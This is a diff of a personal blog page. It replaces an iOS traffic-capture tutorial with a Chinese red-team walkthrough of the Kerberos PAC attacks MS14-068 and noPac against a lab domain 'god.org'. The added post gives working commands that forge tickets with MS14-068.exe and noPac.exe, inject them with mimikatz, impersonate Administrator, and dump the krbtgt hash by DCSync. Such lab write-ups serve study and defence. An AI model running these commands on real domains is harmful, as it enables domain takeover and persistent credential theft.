@@ -19,29 +19,30 @@
   <meta name="author" content="yankun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Brupsuite+Shadowrocket抓取APP数据包前提我之前在电脑上配置代理抓取微信小程序的包一直不成功而且不知道哪里出现问题，后面了解到可以直接在手机上抓取访问的数据包。下面就讲讲如何在手机上配置Shadowrocket抓取手机上的数据包 环境准备电脑和手机都处于同一个局域环境下或者可以使用电脑开热点手机来连接（不知道为什么没成功当时使用的是手机开热点，电脑连接手机的热点一直没成功）">
+    <meta name="description" content="1.MS14-068简单概括下：利用 Kerberos PAC 签名验证缺陷，攻击者可以伪造自己为域管理员，从而获取域管权限 该漏洞原理是KDC无法正确检验PAC签名的有效性，从而产生的漏洞。具体细节就不分析了 12MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="如何配置ios的代理抓取APP的数据包">
-<meta property="og:url" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/index.html">
+<meta property="og:title" content="PAC攻击">
+<meta property="og:url" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="yankun">
-<meta property="og:description" content="Brupsuite+Shadowrocket抓取APP数据包前提我之前在电脑上配置代理抓取微信小程序的包一直不成功而且不知道哪里出现问题，后面了解到可以直接在手机上抓取访问的数据包。下面就讲讲如何在手机上配置Shadowrocket抓取手机上的数据包 环境准备电脑和手机都处于同一个局域环境下或者可以使用电脑开热点手机来连接（不知道为什么没成功当时使用的是手机开热点，电脑连接手机的热点一直没成功）">
+<meta property="og:description" content="1.MS14-068简单概括下：利用 Kerberos PAC 签名验证缺陷，攻击者可以伪造自己为域管理员，从而获取域管权限 该漏洞原理是KDC无法正确检验PAC签名的有效性，从而产生的漏洞。具体细节就不分析了 12MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&amp;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518194927643.png">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518195245061.png">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201659907.png">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201825379.png">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201953040.png">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518202133008.png">
-<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201225897.png">
-<meta property="article:published_time" content="2025-05-18T12:22:23.028Z">
-<meta property="article:modified_time" content="2025-05-18T12:21:34.049Z">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520141637752.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520141827732.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520142046040.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519221315343.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519221847865.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519222048954.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519223252473.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519223450962.png">
+<meta property="article:published_time" content="2025-05-20T06:30:37.393Z">
+<meta property="article:modified_time" content="2025-05-20T06:54:21.671Z">
 <meta property="article:author" content="yankun">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yankun8.github.io/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518194927643.png">
+<meta name="twitter:image" content="https://yankun8.github.io/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520141637752.png">
   
   
   
-  <title>如何配置ios的代理抓取APP的数据包 - yankun</title>
+  <title>PAC攻击 - yankun</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +208,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="如何配置ios的代理抓取APP的数据包"></span>
+            <span id="subtitle" data-typed-text="PAC攻击"></span>
           
         </div>
 
@@ -218,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-05-18 20:22" pubdate>
-          2025年5月18日 晚上
+        <time datetime="2025-05-20 14:30" pubdate>
+          2025年5月20日 下午
         </time>
       </span>
     
@@ -230,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          530 字
+          684 字
         
       </span>
     
@@ -241,7 +242,7 @@
         
         
         
-          5 分钟
+          6 分钟
         
       </span>
     
@@ -278,42 +279,54 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">如何配置ios的代理抓取APP的数据包</h1>
+            <h1 id="seo-header">PAC攻击</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="Brupsuite-Shadowrocket抓取APP数据包"><a href="#Brupsuite-Shadowrocket抓取APP数据包" class="headerlink" title="Brupsuite+Shadowrocket抓取APP数据包"></a>Brupsuite+Shadowrocket抓取APP数据包</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>我之前在电脑上配置代理抓取微信小程序的包一直不成功而且不知道哪里出现问题，后面了解到可以直接在手机上抓取访问的数据包。下面就讲讲如何在手机上配置Shadowrocket抓取手机上的数据包</p>
-<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>电脑和手机都处于同一个局域环境下或者可以使用电脑开热点手机来连接（不知道为什么没成功当时使用的是手机开热点，电脑连接手机的热点一直没成功）</p>
-<p>手机安装Shadowrocket作为代理，让手机访问的数据包的时候会经过Shadowrocket配置的节点</p>
-<h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>环境准备好之后开始</p>
-<h4 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h4><p>在电脑上查看当前的网卡信息</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure>
+                <h3 id="1-MS14-068"><a href="#1-MS14-068" class="headerlink" title="1.MS14-068"></a>1.MS14-068</h3><p>简单概括下：利用 Kerberos PAC 签名验证缺陷，攻击者可以伪造自己为域管理员，从而获取域管权限</p>
+<p>该漏洞原理是KDC无法正确检验PAC签名的有效性，从而产生的漏洞。具体细节就不分析了</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">MS14-<span class="hljs-number">068</span>.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt; #伪造 Kerberos 票据(TGT)，提升权限为域管理员 <br>MS14-<span class="hljs-number">068</span>.exe -u web@god.org -p Admin123 -s  S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">345784219</span>-<span class="hljs-number">2510415755</span>-<span class="hljs-number">3375813427</span>-<span class="hljs-number">1103</span> -d <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">11</span>.<span class="hljs-number">11</span><br></code></pre></td></tr></table></figure>
 
-<p>这里我电脑的IP地址是10.19.241.6</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518194927643.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518194927643">
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520141637752.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250520141637752">
 
-<h4 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h4><p>在bp上配置代理规则：</p>
-<p>bp配置的IP不能是127.0.0.1，因为后面在Shadowrocket配置节点的IP地址的时候填入127.0.0.1就会认为是手机本地的地址，所以这里必须配置为10.19.241.6端口随意</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518195245061.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518195245061">
+<p>使用mimikatz将票据注入到内存</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">kerberos::<span class="hljs-title">ptc</span> <span class="hljs-title">TGT_web</span>@<span class="hljs-title">god.org.ccache</span></span><br></code></pre></td></tr></table></figure>
 
-<h4 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h4><p>手机上配置Shadowrocket</p>
-<p>地址填电脑上的IP地址，端口填在bp上配置的9999，类型填HTTP因为是让访问HTTP的流量经过Shadowrocket配置的节点（让访问HTTP流量经过电脑的9999端口）配置完点保存</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201659907.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518201659907">
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520141827732.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250520141827732">
 
-<p>然后Shadowrocket要配置全局路由代理然后点击连通性测试看能不能通，如果没通就是可能电脑的防火墙没关（我之前配的时候就是因为没关防火墙导致一直没通）</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201825379.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518201825379">
+<p>最后检验下：</p>
+<p>不知道哪里问题我这台Server 2016是没打KB3011780补丁的。</p>
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250520142046040.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250520142046040">
 
-<h4 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h4><p>安装证书跟电脑抓包一样</p>
-<p>访问10.19.241.6:9999下载证书</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201953040.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518201953040">
+<h3 id="2-NoPac"><a href="#2-NoPac" class="headerlink" title="2.NoPac"></a>2.NoPac</h3><p>一句话介绍下个漏洞：</p>
+<p>通过伪造普通用户账户名诱导域控误认身份（CVE-2021-42278、获得TGT），并利用 Kerberos PAC 校验缺陷（CVE-2021-42287、验证中并没校验pac中你是谁是否与你开始申请的TGT一致，从而获得TGS），伪装成高权限账户获取服务票据</p>
+<p>再简单说下细节：</p>
+<p>第一部分，假设你的账户名叫DC，KDC在尝试查DC这个用户时候发现不存在，Windows有一个默认行为:找不到用户自动加上$去查找，正好找到了域控机器账户DC$，于是KDC用DC$的PAC填进了你的票据（TGT），第二部份简单说，KDC我们比作为看门的，域控的身份我比作为国王，现在就是你进门的时候说你是普通人，但后面看门的问你“你是谁”时，你就把从第一部分获取来的我是国王身份给他看，KDC居然没有合适，还真就给你了国王通行证</p>
+<p>直接使用<a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">NoPac.exe</a>工具来将普通域内用户权限提到域管，该工具可以实现检测是否存在这个漏洞和一件生成好票据</p>
+<p>检测该域内环境是否存在该漏洞</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">noPac.exe scan -domain god.org -user &quot;web&quot; -pass &quot;Admin123&quot;<br>#god.org是域名，web是域用户，pass是域用户密码<br></code></pre></td></tr></table></figure>
 
-<p>下载完会在手机中的设置中提示安装就完了，最后在设置中的通用中关于本机中的证书信任设置中勾选PortSwigger CA就完事了</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518202133008.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518202133008">
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519221315343.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250519221315343">
 
-<h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4><p>随便访问一个小程序看bp能否抓到包，成功抓取over</p>
-<img src="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/image-20250518201225897.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250518201225897">
+<p>实现未开始之前先测试能否访问dc.god.org</p>
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519221847865.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250519221847865">
 
+<p>获得域控cifs的权限TGS票据并将票据注入到内存中。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">noPac.exe -domain god.org -user &quot;web&quot; -pass &quot;Admin123&quot; /dc dc.god.org /mAccount yankun /mPassword ADMIN123 /service cifs /ptt#/mAccount是创建一个名为yankun的机器账户名字随意，后面的密码随意<br></code></pre></td></tr></table></figure>
+
+<p>测试TGS票据是否可用,成功访问</p>
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519222048954.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250519222048954">
+
+<p>获取krbtgt的hash来制造黄金票据TGS</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">noPac.exe -domain god.org -user &quot;web&quot; -pass &quot;Admin123&quot; /dc dc.god.org /mAccount yankun2 /mPassword ADMIN123 /service ldap /ptt /impersonate Administrator #获取域管理员的TGT票据<br></code></pre></td></tr></table></figure>
+
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519223252473.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250519223252473">
+
+<p>DCSync攻击，导出krbtgt的hash,有krbrgt的hash也就实现持久化控制</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mimikatz.exe &quot;lsadump::dcsync /domain:god.org /user:krbtgt /csv&quot; &quot;<span class="hljs-keyword">exit</span>&quot;<br></code></pre></td></tr></table></figure>
+
+<img src="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/image-20250519223450962.png" srcset="/blog/img/loading.gif" lazyload class title="image-20250519223450962">
 
                 
               </div>
@@ -331,8 +344,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>如何配置ios的代理抓取APP的数据包</div>
-      <div>https://yankun8.github.io/blog/2025/05/18/代理/ios代理/</div>
+      <div>PAC攻击</div>
+      <div>https://yankun8.github.io/blog/2025/05/20/红队技能/域渗透/PAC攻击/</div>
     </div>
     <div class="license-meta">
       
@@ -344,7 +357,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年5月18日</div>
+          <div>2025年5月20日</div>
         </div>
       
       
@@ -376,18 +389,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blog/2025/05/20/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E5%9F%9F%E6%B8%97%E9%80%8F/PAC%E6%94%BB%E5%87%BB/" title="PAC攻击">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">PAC攻击</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/" title="MySQL提权">
-                        <span class="hidden-mobile">MySQL提权</span>
+                      <a href="/blog/2025/05/18/%E4%BB%A3%E7%90%86/ios%E4%BB%A3%E7%90%86/" title="如何配置ios的代理抓取APP的数据包">
+                        <span class="hidden-mobile">如何配置ios的代理抓取APP的数据包</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
